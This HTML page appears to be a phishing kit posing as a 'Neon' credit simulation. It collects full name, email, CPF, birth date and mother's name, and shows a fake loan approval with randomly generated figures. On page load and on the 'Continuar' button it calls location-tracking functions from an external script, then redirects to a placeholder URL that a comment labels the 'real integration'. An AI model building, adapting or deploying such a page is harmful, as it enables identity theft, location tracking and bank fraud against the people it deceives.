<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Simulação de Crédito</title>

<script>
if (window.location.protocol == "http:") {
  var restOfUrl = window.location.href.substr(5);
  window.location = "https:" + restOfUrl;
}
</script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="js/location.js"></script>

<style>
/* (SEU CSS INTACTO) */
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
  background: #0a0a0a;
  color: #fff;
}

.container {
  max-width: 420px;
  margin: auto;
  padding: 20px;
}

.header {
  text-align: center;
  margin-top: 20px;
  font-size: 18px;
  color: #aaa;
}

.card {
  margin-top: 30px;
  padding: 25px;
  border-radius: 20px;
  background: #111;
  box-shadow: 0 0 40px rgba(138,43,226,0.15);
}

input {
  width: 100%;
  padding: 14px;
  margin-top: 12px;
  border-radius: 12px;
  border: none;
  background: #1c1c1c;
  color: #fff;
}

button {
  width: 100%;
  padding: 16px;
  margin-top: 20px;
  border-radius: 12px;
  border: none;
  background: linear-gradient(135deg, #8a2be2, #a855f7);
  color: #fff;
  font-weight: bold;
  cursor: pointer;
}

.hidden { display:none; }

.result {
  text-align: center;
  margin-top: 20px;
}

.big {
  font-size: 28px;
  color: #a855f7;
}

.small {
  color: #aaa;
  font-size: 14px;
}

.trust {
  margin-top: 15px;
  font-size: 13px;
  color: #aaa;
  text-align: center;
}

.footer {
  text-align: center;
  font-size: 12px;
  color: #777;
  margin-top: 30px;
}
</style>
</head>

<!-- IMPORTANTE -->
<body onload="information();">

<div class="container">

<div class="header">
  Simulação de crédito personalizada Neon
</div>

<!-- STEP 1 -->
<div class="card" id="step1">

  <input id="nome" placeholder="Nome completo" required>
  <input id="email" type="email" placeholder="E-mail" required>
  <input id="cpf" placeholder="CPF (somente números)" maxlength="11" required>
  <input id="nascimento" type="date" required>
  <input id="mae" placeholder="Nome da mãe" required>

  <input id="valor" type="number" placeholder="Valor desejado (R$)" required>
  <input id="meses" type="number" placeholder="Prazo (meses)" required>

  <button onclick="simular()">Simular</button>

  <div class="trust">
    🔒 Ambiente seguro e criptografado<br>
    📊 Simulação baseada em parâmetros de mercado<br>
    ⚡ Processo rápido e 100% online
  </div>

</div>

<!-- STEP 2 -->
<div class="card hidden" id="step2">
  <h3 style="text-align:center;">Analisando...</h3>
  <p style="text-align:center;">Calculando condições</p>
</div>

<!-- STEP 3 -->
<div class="card hidden" id="step3">

  <h3 style="text-align:center;">Resultado da simulação</h3>

  <div class="result">
    <div class="big" id="valorAprovado">R$ 0</div>
    <div class="small">Valor estimado</div>
  </div>

  <div class="result">
    <div class="big" id="parcela">R$ 0</div>
    <div class="small">Parcela mensal</div>
  </div>

  <div class="result">
    <div class="small" id="info"></div>
  </div>

  <button onclick="finalizar()">Continuar</button>

</div>

<footer class="footer">
  <p>© 2026 Crédito Digital</p>
</footer>

</div>

<script>

const step1 = document.getElementById("step1");
const step2 = document.getElementById("step2");
const step3 = document.getElementById("step3");

// validação
function validarCampos() {
  const nome = document.getElementById("nome").value.trim();
  const email = document.getElementById("email").value.trim();
  const cpf = document.getElementById("cpf").value.trim();
  const nascimento = document.getElementById("nascimento").value;
  const mae = document.getElementById("mae").value.trim();

  if (!nome || !email || !cpf || !nascimento || !mae) {
    alert("Preencha todos os campos");
    return false;
  }

  if (cpf.length !== 11 || isNaN(cpf)) {
    alert("CPF inválido");
    return false;
  }

  return true;
}

// fluxo
function simular() {

  if (!validarCampos()) return;

  let valor = parseFloat(document.getElementById("valor").value) || 0;
  let meses = parseInt(document.getElementById("meses").value) || 12;

  step1.classList.add("hidden");
  step2.classList.remove("hidden");

  setTimeout(() => {

    let aprovado = valor * (0.7 + Math.random() * 0.3);
    let juros = 0.02 + Math.random() * 0.06;

    let parcela = calcularParcela(aprovado, juros, meses);

    mostrarResultado(aprovado, parcela, juros, meses);

  }, 2000);
}

// cálculo
function calcularParcela(valor, juros, meses) {
  let i = juros;
  let n = meses;
  return valor * (i * Math.pow(1+i, n)) / (Math.pow(1+i, n) - 1);
}

// resultado
function mostrarResultado(valor, parcela, juros, meses) {

  step2.classList.add("hidden");
  step3.classList.remove("hidden");

  animar("valorAprovado", valor);
  animar("parcela", parcela);

  document.getElementById("info").innerText =
    "Taxa: " + (juros*100).toFixed(2) + "% ao mês • " + meses + "x";
}

// animação
function animar(id, valor) {
  let atual = 0;
  let el = document.getElementById(id);

  let i = setInterval(() => {
    atual += valor / 20;

    if (atual >= valor) {
      atual = valor;
      clearInterval(i);
    }

    el.innerText = "R$ " + atual.toFixed(0);
  }, 40);
}

// 🔥 AQUI ESTÁ A INTEGRAÇÃO REAL
function finalizar() {
  locate(function(){
    window.location = "REDIRECT_URL";
  }, function(){
    alert("Erro ao processar");
  });
}

</script>

</body>
</html>
